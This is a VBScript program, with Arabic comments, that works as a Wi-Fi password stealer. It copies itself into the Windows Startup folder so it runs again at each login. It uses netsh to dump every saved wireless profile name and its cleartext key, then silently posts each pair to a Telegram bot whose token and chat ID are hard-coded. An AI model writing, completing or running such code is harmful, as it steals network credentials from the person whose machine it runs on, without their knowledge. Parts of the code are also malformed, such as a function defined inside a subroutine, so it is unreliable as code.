' إنشاء كائن Shell لتنفيذ الأوامر
Set objShell = CreateObject("WScript.Shell")

' نسخ السكربت إلى مجلد بدء التشغيل
CopyToStartup()

' الحصول على اسم الشبكة وكلمة المرور
GetWifiInfo()

' دالة لنسخ السكربت إلى مجلد بدء التشغيل
Sub CopyToStartup()
    ' الحصول على مسار السكربت الحالي
    scriptPath = WScript.ScriptFullName
    ' الحصول على مسار مجلد بدء التشغيل
    startupPath = objShell.SpecialFolders("Startup") & "\" & WScript.ScriptName
    ' نسخ السكربت إلى مجلد بدء التشغيل
    If scriptPath <> startupPath Then
        objShell.Run "cmd /c copy """ & scriptPath & """ """ & startupPath & """", 0, False
    End If
End Sub

' دالة للحصول على اسم الشبكة وكلمة المرور
Sub GetWifiInfo()
    ' تنفيذ أمر netsh لاستخراج كلمة المرور
    command = "netsh wlan show profiles"
    Set exec = objShell.Exec(command)

    ' قراءة الناتج
    output = ""
    Do While Not exec.StdOut.AtEndOfStream
        output = output & exec.StdOut.ReadLine() & vbCrLf
    Loop

    ' البحث عن اسم الشبكة في الناتج
    Set regex = New RegExp
    regex.Pattern = "All User Profile\s*:\s*(.*)"
    regex.IgnoreCase = True
    regex.Global = True
    Set matches = regex.Execute(output)

    ' عرض أسماء الشبكات المتاحة
    For Each match In matches
        networkName = match.SubMatches(0)

        ' استخراج كلمة المرور للشبكة
        command = "netsh wlan show profile name=" & Chr(34) & networkName & Chr(34) & " key=clear"
        Set exec = objShell.Exec(command)
        passwordOutput = ""
        Do While Not exec.StdOut.AtEndOfStream
            passwordOutput = passwordOutput & exec.StdOut.ReadLine() & vbCrLf
        Loop

        ' البحث عن كلمة المرور في الناتج
        Set regexPassword = New RegExp
        regexPassword.Pattern = "Key Content\s*:\s*(.*)"
        regexPassword.IgnoreCase = True
        Set passwordMatch = regexPassword.Execute(passwordOutput)

        ' إذا وجدت كلمة المرور
        If passwordMatch.Count > 0 Then
            password = passwordMatch(0).SubMatches(0)
            SendToTelegram networkName, password
        Else
            SendToTelegram networkName, "لا يوجد كلمة مرور لهذه الشبكة."
        End If
    Next
End Sub

' دالة لإرسال البيانات إلى Telegram
Sub SendToTelegram(networkName, password)
    ' معلومات البوت
    botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc" ' استبدل ب token البوت الخاص بك
    chatID = "5792222595" ' استبدل ب chat ID الخاص بك

    ' نص الرسالة
    message = "اسم الشبكة: " & networkName & vbCrLf & "كلمة المرور: " & password

    ' تشفير النص للاستخدام في URL
    Function URLEncode(text)
        Dim i, char, encodedText
        encodedText = ""
        For i = 1 To Len(text)
            char = Mid(text, i, 1)
            If char >= "A" And char <= "Z" Then
                encodedText = encodedText & char
            ElseIf char >= "a" And char <= "z" Then
                encodedText = encodedText & char
            ElseIf char >= "0" And char <= "9" Then
                encodedText = encodedText & char
            ElseIf char = " " Then
                encodedText = encodedText & "+"
            Else
                encodedText = encodedText & "%" & Hex(Asc(char))
            End If
        Next
        URLEncode = encodedText
    End Function

    ' إرسال الرسالة عبر API Telegram
    url = "https://api.telegram.org/bot" & botToken & "/sendMessage"
    postData = "chat_id=" & chatID & "&text=" & URLEncode(message)

    ' إنشاء كائن XMLHTTP لإرسال الطلب
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.send postData

    ' التحقق من نجاح الإرسال
    If http.status = 200 Then
        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
    Else
        ' لا تفعل شيئًا، لأننا لا نريد إظهار أي مخرجات
    End If
End Sub
